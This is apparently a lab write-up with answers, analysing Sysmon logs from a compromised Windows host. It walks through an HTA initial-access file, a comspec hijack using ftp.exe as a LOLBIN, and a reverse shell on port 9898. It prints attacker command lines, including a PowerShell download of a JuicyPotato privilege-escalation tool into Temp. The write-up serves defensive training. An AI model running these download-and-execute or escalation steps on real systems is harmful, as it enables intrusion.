# Sysmon Mini Project

**System Monitor (Sysmon)** is a Windows system service and device driver that provides detailed monitoring of operating system activity, including process monitoring and network activity. This information can be beneficial in understanding various exploitation techniques.

A zipped file is provided to assist in solving the challenges. 

**Download the “Sysmon logs.zip”** and enter the password **“blto”** to access the files.

---

### Tools/Utilities Used:
- Text Editor
- Linux CLI

---

## Scenario

You are provided with Sysmon logs from a compromised endpoint. Analyze the logs to identify the steps and techniques used by the attacker.

---

## Challenges

### 1. What is the file that gave access to the attacker?
**Answer:** `updater.hta`

- The first event with the associated IP shows that `chrome.exe` was used to download an HTA file named `updater.hta` from the identified IP address.

### 2. What is the PowerShell cmdlet used to download the malware file and what is the port?
**Answer:** `Invoke-WebRequest`, Port: `6969`

![Log](https://github.com/prakharvr02/Sysmon-Mini-Project/blob/main/Log%20Analysis%20Images/1.webp)

- The log indicates that the attacker utilized the `Invoke-WebRequest` PowerShell cmdlet to download a file named `supply.exe` from the IP `192.168.1.11` using port `6969`.

  - **IP Address:** 192.168.1.11
  - **Port No:** 6969
  - **PowerShell Cmdlet:** Invoke-WebRequest

### 3. What is the name of the environment variable set by the attacker?
**Answer:** `comspec=c:\Windows\temp\supply.exe`

- **Explanation:** The environment variable `comspec` points to what appears to be a malicious executable.

### 4. What is the process used as a LOLBIN to execute malicious commands?
**Answer:** `ftp.exe`

- **Explanation:** “LOLbin” stands for “Living Off the Land Binary.” It refers to legitimate system binaries that can be exploited for malicious purposes. Where logs indicate a new event following the setting of the `comspec` variable:

![Log](https://github.com/prakharvr02/Sysmon-Mini-Project/blob/main/Log%20Analysis%20Images/2.webp)

- The command executed is `cmd \c set comspec=C:\windows\temp\supply.exe`, followed by the execution of `ftp.exe`, which utilizes the new environment variable.

### 5. What is the first command executed by the malware?
**Answer:** `ipconfig`

- **Explanation:** The command `C:\\windows\\temp\\supply.exe /c "ipconfig"` is observed, indicating an initial network configuration check.

### 6. Based on dependency events, what language is the malware written in?
**Answer:** `Python`

![Log](https://github.com/prakharvr02/Sysmon-Mini-Project/blob/main/Log%20Analysis%20Images/3.webp)

### 7. Malware then downloads a new file. What is the full URL?
**Answer:** `https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe`

- **Explanation:** The command line for `supply.exe` indicates:
```
  C:\windows\temp\supply.exe /c "powershell -c Invoke-WebRequest -Uri https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe -OutFile C:\Windows\Temp\juice.exe"
```


This command downloads `JuicyPotato.exe` from the specified URL and saves it as `juice.exe` in the Temp folder.

### 8. What port does the attacker try to use for a reverse shell?
**Answer:** `9898`

![Log](https://github.com/prakharvr02/Sysmon-Mini-Project/blob/main/Log%20Analysis%20Images/4.webp)

- **Explanation:** The attacker uses `juicy.exe` to establish a netcat shell back to their system with the command:

